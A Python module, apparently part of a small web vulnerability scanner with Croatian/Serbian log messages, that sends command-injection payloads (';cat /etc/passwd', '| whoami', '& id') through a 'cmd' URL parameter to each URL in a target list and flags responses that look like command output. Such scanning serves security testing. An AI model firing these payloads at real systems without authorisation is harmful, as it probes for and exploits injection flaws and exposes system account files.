import sys, os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import requests
from core.log_to_text import log_to_text, classify_severity

CMD_PAYLOADS = [
    ";cat /etc/passwd",
    "| whoami",
    "& id"
]

def load_targets(file_path="targets/targets.txt"):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def test_cmd_injection(base_url):
    results = []
    for payload in CMD_PAYLOADS:
        test_url = f"{base_url}?cmd={payload}"
        print(f"[+] Testiram: {test_url}")
        try:
            res = requests.get(test_url, timeout=5)
            if any(x in res.text.lower() for x in ["root:x", "uid=", "admin"]):
                print(f"[!] Mogući CMD Injection: {test_url}")
                results.append(test_url)
        except Exception as e:
            print(f"[-] Greška: {e}")
    return results

def run_cmd_scan():
    print("[~] Pokrećem Command Injection test...")
    targets = load_targets()
    for url in targets:
        found = test_cmd_injection(url)
        if found:
            severity = classify_severity("\n".join(found))
            log_to_text(__file__, "\n".join(found) + f' | Severity: {severity}')

if __name__ == "__main__":
    run_cmd_scan()
